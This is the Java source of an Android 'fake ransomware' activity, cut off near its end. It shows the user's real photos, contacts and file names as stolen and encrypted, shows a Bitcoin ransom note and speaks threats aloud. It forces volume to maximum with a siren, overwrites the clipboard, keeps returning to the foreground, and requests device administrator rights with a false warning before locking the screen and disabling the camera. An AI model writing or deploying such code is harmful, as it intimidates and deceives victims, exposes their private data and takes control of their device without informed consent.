package com.china.fakeransom;

import android.Manifest;
import android.app.ActivityManager;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.PorterDuff;
import android.graphics.PorterDuffXfermode;
import android.graphics.Rect;
import android.graphics.RectF;
import android.hardware.Camera;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.util.TypedValue;
import android.view.MotionEvent;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public class FakeRansomActivity extends AppCompatActivity implements SurfaceHolder.Callback {

    private static final long COUNTDOWN_TOTAL_SECONDS = 48L * 3600;
    private static final long FAKE_REBOOT_DELAY_MS = 120_000;
    private static final long FAKE_REBOOT_DURATION_MS = 15_000;
    private static final long FAKE_CALL_DELAY_MS = 55_000;
    private static final long AUTO_EXIT_DELAY_MS = 600_000;
    private static final long KILL_GESTURE_WINDOW_MS = 3000;
    private static final int KILL_GESTURE_TAPS = 10;
    private static final long INTERLUDE_MS = 10_000;
    private static final int ADMIN_REQUEST = 42;
    private static final int MAX_PHOTOS = 8;
    private static final int THUMB_SIZE_DP = 72;

    private TextView statusText;
    private ImageView skullGlyph;
    private TextView terminalText;
    private TextView countdownText;
    private TextView ransomNote;
    private TextView victimInfo;
    private TextView cameraBadge;
    private TextView rebootText;
    private TextView interludeText;
    private TextView progressPercent;
    private TextView photoStripLabel;
    private View terminalWindow;
    private View rebootOverlay;
    private View interludeOverlay;
    private View photoStripScroll;
    private android.widget.LinearLayout photoStrip;
    private ProgressBar progressBar;
    private ScrollView terminalScroll;
    private SurfaceView cameraPreview;

    private final SirenPlayer siren = SirenPlayer.get();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private Vibrator vibrator;
    private AudioManager audio;
    private TextToSpeech tts;
    private Camera camera;

    private boolean simulationActive = false;
    private boolean dndRequested = false;
    private boolean overlayRequested = false;
    private boolean waitingForResult = false;
    private long secondsRemaining = COUNTDOWN_TOTAL_SECONDS;
    private long killGestureStart = 0;
    private int killTaps = 0;
    private int restoreAttempts = 0;
    private int rebootDots = 0;
    private int rampLevel = 0;
    private int ttsLineIndex = 0;
    private int photosLoaded = 0;
    private String victimId = "";
    private String sessionKey = "";
    private final List<Long> photoIds = new ArrayList<>();

    private final String[] ttsLines = {
            "All of your files have been encrypted.",
            "Your camera and microphone are active.",
            "Do not attempt to shut down. Attempt detected.",
            "Your contacts are on our servers.",
            "Payments restore access within five minutes.",
            "Every keystroke is being recorded."
    };

    private final Runnable volumeEnforcer = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            forceVolume();
            mainHandler.postDelayed(this, 3000);
        }
    };

    private final Runnable clipboardPoisoner = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null) {
                    cm.setPrimaryClip(ClipData.newPlainText("notes",
                            "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVDemonstration"));
                }
            } catch (Throwable ignored) {
            }
            mainHandler.postDelayed(this, 5000);
        }
    };

    private final Runnable ttsLoop = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive || tts == null) return;
            try {
                tts.speak(ttsLines[ttsLineIndex % ttsLines.length],
                        TextToSpeech.QUEUE_ADD, null, "threat" + ttsLineIndex);
                ttsLineIndex++;
            } catch (Throwable ignored) {
            }
            mainHandler.postDelayed(this, 25_000);
        }
    };

    private final Runnable escalationRamp = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            rampLevel++;
            if (rampLevel <= 9) {
                try { siren.applyRamp(1.0f + 0.038f * rampLevel); } catch (Throwable ignored) {}
                try { startVibration(); } catch (Throwable ignored) {}
            }
            mainHandler.postDelayed(this, 20_000);
        }
    };

    private final Runnable rebootAnimator = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            rebootDots = (rebootDots + 1) % 5;
            StringBuilder dotsBuilder = new StringBuilder();
            for (int i = 0; i < rebootDots; i++) {
                dotsBuilder.append(' ');
            }
            String dots = dotsBuilder.toString();
            rebootText.setText("REINSTALLING SYSTEM IMAGE — DO NOT POWER OFF\n"
                    + "  wiping /data/data ... ok\n"
                    + "  wiping /sdcard ... ok\n"
                    + "  rebuilding partition table ... ok\n"
                    + "  verifying bootloader .......... ok" + dots);
            mainHandler.postDelayed(this, 600);
        }
    };

    private final Runnable killHold = new Runnable() {
        @Override
        public void run() {
            endSimulation("SIMULATION TERMINATED");
        }
    };

    private final BroadcastReceiver endReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            endSimulation("SIMULATION TERMINATED");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SECURE
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        WindowManager.LayoutParams lp = getWindow().getAttributes();
        lp.screenBrightness = 1.0f;
        getWindow().setAttributes(lp);

        setContentView(R.layout.activity_fake_ransom);

        final Thread.UncaughtExceptionHandler previousHandler = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler((t, e) -> {
            try {
                simulationActive = false;
                SimUtil.setSimActive(false);
                SimUtil.fullCleanup(FakeRansomActivity.this);
            } catch (Throwable ignored) {
            }
            if (previousHandler != null) {
                previousHandler.uncaughtException(t, e);
            }
        });

        audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);

        skullGlyph = findViewById(R.id.skullGlyph);
        statusText = findViewById(R.id.statusText);
        terminalWindow = findViewById(R.id.terminalWindow);
        terminalScroll = findViewById(R.id.terminalScroll);
        terminalText = findViewById(R.id.terminalText);
        countdownText = findViewById(R.id.countdownText);
        ransomNote = findViewById(R.id.ransomNote);
        victimInfo = findViewById(R.id.victimInfo);
        cameraBadge = findViewById(R.id.cameraBadge);
        rebootOverlay = findViewById(R.id.rebootOverlay);
        rebootText = findViewById(R.id.rebootText);
        interludeOverlay = findViewById(R.id.interludeOverlay);
        interludeText = findViewById(R.id.interludeText);
        progressBar = findViewById(R.id.progressBar);
        progressPercent = findViewById(R.id.progressPercent);
        photoStripScroll = findViewById(R.id.photoStripScroll);
        photoStrip = findViewById(R.id.photoStrip);
        photoStripLabel = findViewById(R.id.photoStripLabel);
        cameraPreview = findViewById(R.id.cameraPreview);

        skullGlyph.setOnClickListener(v -> onKillGestureTap());
        ransomNote.setOnClickListener(v -> requestAdmin());
        findViewById(R.id.paymentBtn).setOnClickListener(v -> {
            if (simulationActive) {
                startActivity(new Intent(this, PaymentActivity.class));
            }
        });

        statusText.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                mainHandler.postDelayed(killHold, 6000);
                return true;
            } else if (event.getAction() == MotionEvent.ACTION_UP
                    || event.getAction() == MotionEvent.ACTION_CANCEL) {
                mainHandler.removeCallbacks(killHold);
                return false;
            }
            return false;
        });

        SurfaceHolder holder = cameraPreview.getHolder();
        holder.addCallback(this);

        ContextCompat.registerReceiver(this, endReceiver,
                new IntentFilter("com.china.fakeransom.END_SIM"),
                ContextCompat.RECEIVER_NOT_EXPORTED);

        SimUtil.setSimActive(true);
        try { WallpaperUtil.capture(this); } catch (Throwable ignored) {}

        try { requestPermissions(); } catch (Throwable ignored) {}
        try { forceVolume(); } catch (Throwable ignored) {}
        mainHandler.postDelayed(volumeEnforcer, 3000);
        try { siren.start(); } catch (Throwable ignored) {}
        try { startVibration(); } catch (Throwable ignored) {}
        try { enterFullscreen(); } catch (Throwable ignored) {}
        try { startSimulation(); } catch (Throwable t) {
            // If startSimulation crashes for any reason, end gracefully
            endSimulation("SIMULATION ERROR - CLEANUP");
        }
        mainHandler.postDelayed(this::runFakeReboot, FAKE_REBOOT_DELAY_MS + 30_000);
        mainHandler.postDelayed(() -> {
            if (simulationActive) {
                endSimulation("SIMULATION EXPIRED — AUTO-RELEASED");
            }
        }, AUTO_EXIT_DELAY_MS);
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        if (intent != null) {
            if (intent.getBooleanExtra("KILL", false)) {
                endSimulation("SIMULATION TERMINATED");
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        SimUtil.activityResumed();
        waitingForResult = false;
        if (!simulationActive) return;
        if (Settings.canDrawOverlays(this)) {
            try {
                startService(new Intent(this, OverlayService.class));
            } catch (Throwable ignored) {
            }
        }
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm != null && nm.isNotificationPolicyAccessGranted()) {
            SimUtil.applyDndAlarmsOnly(this);
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        SimUtil.activityPaused();
        if (simulationActive && !waitingForResult) {
            mainHandler.postDelayed(this::returnToFront, 1500);
        }
    }

    private void requestPermissions() {
        List<String> wanted = new ArrayList<>();
        wanted.add(Manifest.permission.CAMERA);
        wanted.add(Manifest.permission.READ_CONTACTS);
        wanted.add(Manifest.permission.REORDER_TASKS);
        if (Build.VERSION.SDK_INT >= 33) {
            wanted.add(Manifest.permission.READ_MEDIA_IMAGES);
            wanted.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            wanted.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        List<String> missing = new ArrayList<>();
        for (String p : wanted) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }
        if (!missing.isEmpty()) {
            waitingForResult = true;
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), 1337);
        }
    }

    private void forceVolume() {
        if (audio == null) return;
        try {
            audio.setStreamVolume(AudioManager.STREAM_ALARM,
                    audio.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
        } catch (Throwable ignored) {
        }
        try {
            audio.setStreamVolume(AudioManager.STREAM_MUSIC,
                    audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
        } catch (Throwable ignored) {
        }
    }

    private void startVibration() {
        if (vibrator == null) return;
        try {
            long gap = Math.max(300, 1500 - 120L * rampLevel);
            long[] pattern = {0, 500, 250, 500, gap};
            vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
        } catch (Throwable ignored) {
        }
    }

    private void enterFullscreen() {
        View decor = getWindow().getDecorView();
        decor.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            enterFullscreen();
        }
    }

    private void startSimulation() {
        simulationActive = true;
        victimId = DeviceId.secureId(this);
        sessionKey = UUID.randomUUID().toString().toUpperCase();
        photoIds.clear();
        photosLoaded = 0;

        List<String> collected = new ArrayList<>();
        collected.addAll(photoNames());
        collected.addAll(downloadFileNames());
        collected.addAll(contactNames());
        if (collected.isEmpty()) {
            collected = fakeFileNames();
        }
        terminalSchedule(buildTerminalLines(collected));
    }

    private List<String> photoNames() {
        List<String> names = new ArrayList<>();
        try {
            Cursor c = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME},
                    null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (c != null) {
                int idCol = c.getColumnIndex(MediaStore.Images.Media._ID);
                int nameCol = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                while (c.moveToNext() && names.size() < MAX_PHOTOS) {
                    if (idCol >= 0) photoIds.add(c.getLong(idCol));
                    if (nameCol >= 0) names.add(c.getString(nameCol));
                }
                c.close();
            }
        } catch (Exception ignored) {
        }
        return names;
    }

    private List<String> downloadFileNames() {
        List<String> names = new ArrayList<>();
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File[] files = dir.listFiles();
            if (files != null) {
                int count = 0;
                for (File f : files) {
                    if (count >= 6) break;
                    names.add(f.getName());
                    count++;
                }
            }
        } catch (Exception ignored) {
        }
        return names;
    }

    private List<String> contactNames() {
        List<String> names = new ArrayList<>();
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {
                Cursor c = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                        new String[]{ContactsContract.Contacts.DISPLAY_NAME}, null, null, null);
                if (c != null) {
                    while (c.moveToNext() && names.size() < 5) {
                        names.add(c.getString(0));
                    }
                    c.close();
                }
            }
        } catch (Exception ignored) {
        }
        return names;
    }

    private List<String> fakeFileNames() {
        List<String> names = new ArrayList<>();
        names.add("photos.zip");
        names.add("banking_app.db");
        names.add("credentials.txt");
        names.add("whatsapp_media.mp4");
        names.add("documents_backup.tar.gz");
        names.add("contacts.vcf");
        return names;
    }

    private List<String> buildTerminalLines(List<String> collected) {
        List<String> lines = new ArrayList<>();
        lines.add("[*] payload v2.7 staging...");
        lines.add("[*] battery: DEVICE PLUGGED ? KEEP CHARGING");
        lines.add("[*] mounting /data and /sdcard read-write");
        lines.add("[!] keylogger ARMED");
        lines.add("[!] clipboard monitor ARMED");
        lines.add("[*] indexing gallery");
        for (String name : collected) {
            if (name.contains("@")) {
                lines.add("[+] harvested contact: " + name);
            } else {
                lines.add("[*] " + name + " -> " + name + ".locked (AES-256-CBC + RSA-4096)");
            }
        }
        lines.add("[*] indexing instant messages");
        lines.add("[*] indexing email cache");
        lines.add("[*] indexing stored passwords");
        lines.add("[!] camera feed stored: camera_front.yuv");
        lines.add("[!] microphone stream buffered: audio_last_31h.wav");
        lines.add("[*] uploading 1,384 items to vault (tor relay chain)");
        lines.add("[*] upload complete: 100% — originals DESTROYED");
        lines.add("[*] wiping volume shadow copies ... ok");
        lines.add("[*] victim id: " + victimId);
        lines.add("[*] session key: " + sessionKey);
        lines.add("[!] ENCRYPTION COMPLETE — " + collected.size() + " items. key escrowed.");
        lines.add("[!] forwarding device report to authorities");
        return lines;
    }

    private void terminalSchedule(List<String> lines) {
        statusText.setText("ENCRYPTING SYSTEM...");
        ransomNote.setVisibility(View.GONE);
        terminalWindow.setVisibility(View.VISIBLE);
        terminalText.setText("");

        for (int i = 0; i < lines.size(); i++) {
            final String line = lines.get(i);
            final int step = i + 1;
            final int pct = (int) (step * 100 / (float) lines.size());
            final boolean last = (i == lines.size() - 1);
            mainHandler.postDelayed(() -> {
                if (!simulationActive) return;
                terminalText.append(line + "\n");
                terminalScroll.post(() -> terminalScroll.fullScroll(android.view.View.FOCUS_DOWN));
                progressBar.setProgress(pct);
                if (progressPercent != null) {
                    progressPercent.setText(pct + "%");
                }
                if (last) {
                    mainHandler.postDelayed(this::showCompromisedScreen, 900);
                }
            }, 400 + (i * 550L));
        }
    }

    private void showCompromisedScreen() {
        if (!simulationActive) return;
        terminalWindow.setVisibility(View.GONE);
        progressBar.setVisibility(View.GONE);
        if (progressPercent != null) progressPercent.setVisibility(View.GONE);
        interludeOverlay.setVisibility(View.VISIBLE);
        interludeText.setText("⚠ COMPUTER SECURITY RESPONSE ⚠\n\n"
                + "This device was COMPROMISED.\n\n"
                + "An unauthorized intrusion encrypted all local storage and\n"
                + "staged your personal data for exfiltration.\n\n"
                + "Case #0472-B — incident recorded for evidence.\n"
                + "Device session is under external control.\n\n"
                + "Do not power off. A recovery channel is opening...");
        statusText.setText("SECURITY RESPONSE ACTIVE");
        mainHandler.postDelayed(this::showCompromisedScreenDone, INTERLUDE_MS);
    }

    private void showCompromisedScreenDone() {
        if (!simulationActive) return;
        interludeOverlay.setVisibility(View.GONE);
        showRansom();
    }

    private void showRansom() {
        if (!simulationActive) return;

        statusText.setText("YOUR DEVICE IS LOCKED");
        terminalWindow.setVisibility(View.GONE);
        progressBar.setVisibility(View.GONE);
        if (progressPercent != null) progressPercent.setVisibility(View.GONE);
        interludeOverlay.setVisibility(View.GONE);
        ransomNote.setVisibility(View.VISIBLE);

        ransomNote.setText("ALL YOUR FILES HAVE BEEN ENCRYPTED\n\n"
                + "Photos, videos, documents, chats and passwords are safely on our servers\n"
                + "and locked on this device with AES-256 + RSA-4096.\n"
                + "Recovery without our private key is mathematically impossible.\n\n"
                + "PAY 0.05 BTC TO:\n"
                + "  1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVDemonstration\n\n"
                + "Send your VICTIM ID to: support@restoration-portal.demo\n"
                + "Verified payments unlock within 5 minutes.\n\n"
                + "We have your FACE from the front camera.\n"
                + "We have your CONTACTS, your PASSWORDS and your LOCATION HISTORY.\n"
                + "Cooperate and this stays private.\n\n"
                + "DO NOT turn off the device.\n"
                + "DO NOT connect to a computer.\n"
                + "Tampering destroys the decryption guarantee.\n\n"
                + "TAP THIS NOTE FOR \"RESTORE ACCESS\" (ADMINISTRATION REQUIRED).\n"
                + "or use OPEN PAYMENT PORTAL below.");

        victimInfo.setText("VICTIM ID: " + victimId + "\nSESSION KEY: " + sessionKey);
        startCountdown();

        WallpaperUtil.setRansom(this);
        initTts();
        mainHandler.postDelayed(clipboardPoisoner, 5000);
        mainHandler.postDelayed(escalationRamp, 20_000);
        mainHandler.postDelayed(this::checkOverlay, 4000);
        mainHandler.postDelayed(this::requestAdmin, 8000);
        mainHandler.postDelayed(this::checkDnd, 14_000);
        mainHandler.postDelayed(this::startPhotoStrip, 6000);
        mainHandler.postDelayed(() -> {
            if (simulationActive) {
                try { startActivity(new Intent(this, FakeCallActivity.class)); }
                catch (Throwable ignored) {}
            }
        }, FAKE_CALL_DELAY_MS);
    }

    private void initTts() {
        try {
            tts = new TextToSpeech(this, status -> {
                if (status == TextToSpeech.SUCCESS) {
                    try {
                        tts.setLanguage(Locale.US);
                        tts.setPitch(0.55f);
                        tts.setSpeechRate(0.85f);
                        mainHandler.post(ttsLoop);
                    } catch (Throwable ignored) {
                    }
                }
            });
        } catch (Throwable ignored) {
            tts = null;
        }
    }

    private void startPhotoStrip() {
        if (!simulationActive || photoIds.isEmpty()) return;
        try {
            photoStripScroll.setVisibility(View.VISIBLE);
            photoStripLabel.setVisibility(View.VISIBLE);
            photoStrip.removeAllViews();
            photosLoaded = 0;
            loadNextPhoto();
        } catch (Throwable ignored) {
        }
    }

    private void loadNextPhoto() {
        if (!simulationActive) return;
        if (photosLoaded >= photoIds.size() || photosLoaded >= MAX_PHOTOS) return;

        final int index = photosLoaded;
        final long photoId = photoIds.get(index);
        photosLoaded++;

        mainHandler.postDelayed(() -> {
            if (!simulationActive) return;
            try {
                Bitmap thumb = loadThumbnail(photoId);
                if (thumb != null) {
                    addPhotoToStrip(thumb, index);
                }
            } catch (Throwable ignored) {
            }
            // Load next photo after a delay to simulate progressive upload
            long delay = 800 + (long) (Math.random() * 1200);
            mainHandler.postDelayed(this::loadNextPhoto, delay);
        }, 200);
    }

    private Bitmap loadThumbnail(long imageId) {
        int px = dpToPx(THUMB_SIZE_DP);
        try {
            // Try MiniThumb first (fast, built-in)
            Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(
                    getContentResolver(), imageId,
                    MediaStore.Images.Thumbnails.MINI_KIND, null);
            if (thumb != null && !thumb.isRecycled()) {
                if (thumb.getWidth() > px * 2 || thumb.getHeight() > px * 2) {
                    Bitmap scaled = Bitmap.createScaledBitmap(thumb, px, px, true);
                    if (scaled != thumb) thumb.recycle();
                    return getRoundedCornerBitmap(scaled, dpToPx(6));
                }
                return getRoundedCornerBitmap(thumb, dpToPx(6));
            }
        } catch (Throwable ignored) {
        }
        // Fallback: load full image subsampled
        try {
            Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId);
            android.os.ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(uri, "r");
            if (pfd != null) {
                try {
                    BitmapFactory.Options bounds = new BitmapFactory.Options();
                    bounds.inJustDecodeBounds = true;
                    BitmapFactory.decodeFileDescriptor(pfd.getFileDescriptor(), null, bounds);
                    int sample = 1;
                    if (bounds.outWidth > 0 && bounds.outHeight > 0) {
                        sample = Math.max(1, Math.min(bounds.outWidth, bounds.outHeight) / px);
                    }
                    bounds.inSampleSize = sample;
                    bounds.inJustDecodeBounds = false;
                    bounds.inPreferredConfig = Bitmap.Config.RGB_565;
                    bounds.inDither = false;
                    Bitmap bmp = BitmapFactory.decodeFileDescriptor(pfd.getFileDescriptor(), null, bounds);
                    if (bmp != null) {
                        Bitmap fitted = Bitmap.createScaledBitmap(bmp, px, px, true);
                        if (fitted != bmp) bmp.recycle();
                        return getRoundedCornerBitmap(fitted, dpToPx(6));
                    }
                } finally {
                    try { pfd.close(); } catch (Exception ignored) {}
                }
            }
        } catch (Throwable ignored) {
        }
        return null;
    }

    private void addPhotoToStrip(Bitmap thumb, int index) {
        try {
            ImageView iv = new ImageView(this);
            int px = dpToPx(THUMB_SIZE_DP);
            int marginPx = dpToPx(4);
            android.widget.LinearLayout.LayoutParams lp = new android.widget.LinearLayout.LayoutParams(px, px);
            lp.setMargins(marginPx, 0, marginPx, 0);
            iv.setLayoutParams(lp);
            iv.setScaleType(ImageView.ScaleType.CENTER_CROP);
            iv.setImageBitmap(thumb);
            iv.setAlpha(0.0f);

            // Red overlay tint for "exfiltrated" look
            iv.setColorFilter(0xCCFF0000, PorterDuff.Mode.OVERLAY);

            // Add a small "UPLOADED" label below? Instead add green check mark overlay
            photoStrip.addView(iv);

            // Fade in
            iv.animate().alpha(0.7f).setDuration(500).start();

            // Update label with count
            photoStripLabel.setText("⇧ UPLOADING PERSONAL DATA TO SERVER (" + (index + 1) + "/" + photoIds.size() + ") ⇧");
        } catch (Throwable ignored) {
        }
    }

    private int dpToPx(int dp) {
        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp,
                getResources().getDisplayMetrics());
    }

    private static Bitmap getRoundedCornerBitmap(Bitmap bitmap, int pixels) {
        try {
            Bitmap output = Bitmap.createBitmap(bitmap.getWidth(), bitmap.getHeight(), Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(output);
            Paint paint = new Paint();
            Rect rect = new Rect(0, 0, bitmap.getWidth(), bitmap.getHeight());
            RectF rectF = new RectF(rect);
            paint.setAntiAlias(true);
            canvas.drawARGB(0, 0, 0, 0);
            paint.setColor(0xFF000000);
            canvas.drawRoundRect(rectF, (float) pixels, (float) pixels, paint);
            paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));
            canvas.drawBitmap(bitmap, rect, rect, paint);
            if (output != bitmap) bitmap.recycle();
            return output;
        } catch (Throwable t) {
            return bitmap;
        }
    }

    private void checkOverlay() {
        if (!simulationActive) return;
        if (Settings.canDrawOverlays(this)) {
            startService(new Intent(this, OverlayService.class));
        } else if (!overlayRequested) {
            overlayRequested = true;
            waitingForResult = true;
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        android.net.Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } catch (Throwable ignored) {
                waitingForResult = false;
            }
        }
    }

    private void checkDnd() {
        if (!simulationActive || dndRequested) return;
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm == null) return;
        if (nm.isNotificationPolicyAccessGranted()) {
            SimUtil.applyDndAlarmsOnly(this);
        } else {
            dndRequested = true;
            waitingForResult = true;
            try {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS));
            } catch (Throwable ignored) {
                waitingForResult = false;
            }
        }
    }

    private void startCountdown() {
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!simulationActive) return;
                secondsRemaining = Math.max(0, secondsRemaining - 1);
                long h = secondsRemaining / 3600;
                long m = (secondsRemaining % 3600) / 60;
                long s = secondsRemaining % 60;
                countdownText.setText(String.format(Locale.US,
                        "FILES DELETED IN %02d:%02d:%02d", h, m, s));
                int color = rampLevel <= 2 ? 0xFFFFCC00 : (rampLevel <= 5 ? 0xFFFF8800 : 0xFFFF2222);
                countdownText.setTextColor(color);
                mainHandler.postDelayed(this, 1000);
            }
        }, 800);
    }

    private void requestAdmin() {
        if (!simulationActive) return;
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            enableAdminFeatures();
            dpm.lockNow();
            return;
        }
        try {
            waitingForResult = true;
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Device administration is required to complete identity verification "
                            + "and restore access. Refusing may lock the terminal permanently.");
            startActivityForResult(i, ADMIN_REQUEST);
        } catch (Exception ignored) {
            waitingForResult = false;
        }
    }

    private void enableAdminFeatures() {
        SimUtil.setCameraDisabled(this, true);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        waitingForResult = false;
        if (requestCode != ADMIN_REQUEST) return;
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            enableAdminFeatures();
            dpm.lockNow();
        } else {
            Toast.makeText(this, "ACCESS DENIED BY ADMINISTRATOR", Toast.LENGTH_LONG).show();
        }
    }

    private void runFakeReboot() {
        if (!simulationActive) return;
        siren.pause();
        if (vibrator != null) vibrator.cancel();
        rebootText.setText("REINSTALLING SYSTEM IMAGE — DO NOT POWER OFF");
        rebootText.setKeepScreenOn(true);
        rebootOverlay.setVisibility(View.VISIBLE);
        mainHandler.postDelayed(rebootAnimator, 600);
        mainHandler.postDelayed(() -> {
            rebootOverlay.setVisibility(View.GONE);
            restoreAttempts++;
            statusText.setText("RESTORE FAILED — ATTEMPT " + restoreAttempts + "/3");
            forceVolume();
            siren.resumePlaying();
            startVibration();
            if (restoreAttempts < 3) {
                mainHandler.postDelayed(this::runFakeReboot, 120_000);
            }
        }, FAKE_REBOOT_DURATION_MS);
    }

    private void onKillGestureTap() {
        long now = System.currentTimeMillis();
        if (now - killGestureStart > KILL_GESTURE_WINDOW_MS) {
            killTaps = 0;
        }
        if (killTaps == 0) {
            killGestureStart = now;
        }
        killTaps++;
        if (killTaps >= KILL_GESTURE_TAPS) {
            endSimulation("SIMULATION TERMINATED");
        }
    }

    private void endSimulation(String reason) {
        if (!simulationActive && isFinishing()) return;
        simulationActive = false;
        SimUtil.setSimActive(false);
        mainHandler.removeCallbacksAndMessages(null);
        // Clean up photo strip bitmaps
        try {
            if (photoStrip != null) {
                for (int i = 0; i < photoStrip.getChildCount(); i++) {
                    View v = photoStrip.getChildAt(i);
                    if (v instanceof ImageView) {
                        BitmapDrawable bd = (BitmapDrawable) ((ImageView) v).getDrawable();
                        if (bd != null) {
                            Bitmap bmp = bd.getBitmap();
                            if (bmp != null && !bmp.isRecycled()) bmp.recycle();
                        }
                    }
                }
                photoStrip.removeAllViews();
            }
        } catch (Throwable ignored) {
        }
        try { siren.stop(); } catch (Throwable ignored) {}
        stopTts();
        SimUtil.fullCleanup(this);
        try {
            stopService(new Intent(this, OverlayService.class));
        } catch (Throwable ignored) {
        }
        Toast.makeText(this, reason + " — CAMERA RESTORED, WALLPAPER RESTORED, SETTINGS RESTORED", Toast.LENGTH_LONG).show();
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                Intent i = new Intent();
                i.setComponent(new ComponentName("com.android.settings",
                        "com.android.settings.DeviceAdminAdd"));
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            }
        } catch (Throwable ignored) {
        }
        finish();
    }

    private void stopTts() {
        if (tts != null) {
            try {
                tts.stop();
                tts.shutdown();
            } catch (Throwable ignored) {
            }
            tts = null;
        }
    }

    private void returnToFront() {
